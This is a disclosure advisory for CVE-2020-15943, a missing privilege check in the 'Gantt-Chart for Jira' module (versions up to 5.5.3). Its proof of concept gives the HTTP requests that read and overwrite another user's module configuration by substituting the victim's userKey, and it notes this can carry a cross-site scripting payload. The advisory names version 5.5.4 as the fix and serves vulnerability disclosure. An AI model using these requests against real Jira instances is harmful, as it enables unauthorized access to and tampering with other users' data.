@@ -1,0 +1,124 @@
+id: 34792
+date: 08/05/2020
+title: Gantt-Chart For Jira 5.5.3 Missing Privilege Check Vulnerability
+author: Sebastian Auwaerter
+cves: CVE-2020-15943
+
+Product: Jira module "Gantt-Chart for Jira"
+Manufacturer: Frank Polscheit - Solutions & IT-Consulting
+Affected Version(s): <=5.5.3
+Tested Version(s): 5.5.3
+Vulnerability Type: Improper Privilege Management (CWE-269)
+Risk Level: High
+Solution Status: Fixed
+Manufacturer Notification: 2020-07-23
+Solution Date: 2020-07-30
+Public Disclosure: 2020-08-03
+CVE Reference: CVE-2020-15943
+Author of Advisory: Sebastian Auwaerter, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Gantt-Chart for Jira is a Jira module for displaying Gantt charts.
+
+The manufacturer describes the product as follows (see [1]):
+
+"High performance Gantt-Chart capable to display multi-projects with
+10.000+ issues aggregating them as top-level big picture"
+
+Due to a missing privilege check, it is possible to read and write
+the module configuration of other users. This can also be used to
+deliver a cross-site scripting payload to other user dashboards,
+as described in security advisory SYSS-2020-030 (see [4]).
+
+To exploit this vulnerability, an attacker has to be authenticated.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The API endpoints for reading and updating the configuration of the
+Jira module require the user ID of a user via the variable
+userKey. Due to a missing privilege check, the user ID of another user
+can be sent instead of the own user ID to read and update a victim's
+module configuration.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+### Getting a username of a victim:
+
+The username of a victim can be seen by browsing their profile.
+
+
+### Getting the chart IDs of the victim
+
+The chart IDs of another user can be enumerated with the following
+request:
+
+- ----
+GET /rest/gantt/1.0/user/properties?userKey=<victim_user_name>&_=<unix
+timestamp (`date +%s`)> HTTP/1.1
+Host: <victim_host>
+[...]
+
+The response should look something like:
+
+HTTP/1.1 200
+[...]
+
+{"keys":"[{\"key\":\"gantt-A\"},{\"key\":\"gantt-B\"}]"}
+- ----
+
+The <chart_id> in the following requests should therefore be gantt-A or
+gantt-B.
+
+
+### Getting the current configuration of the module for that user
+
+The configuration for those charts can be read with the following
+request:
+
+- -----
+GET
+/rest/gantt/1.0/user/properties/<chart_id>?userKey=<victim_user_name>&_=<unix
+timestamp (`date +%s`)> HTTP/1.1
+Host: <victim_host>
+
+The response should look something like:
+
+HTTP/1.1 200
+[...]
+
+<configuration as JSON>
+- ----
+
+### Pushing a new configuration for the victim
+
+The victim's configuration can then be updated by the attacker using
+the following request. The configuration, especially the filter section,
+can be prepared beforehand:
+
+PUT
+/jira/rest/gantt/1.0/user/properties/<chart_id>?userKey=<victim_user_name>
+HTTP/1.1
+Host: <victim_host>
+[...]
+< (edited) configuration as JSON>
+
+The server will update the victim's configuration which can then be
+verified by downloading the victim's configuration again with the
+second GET request mentioned in this advisory.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Update to software version 5.5.4.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#  0day.today [2023-03-21]  #
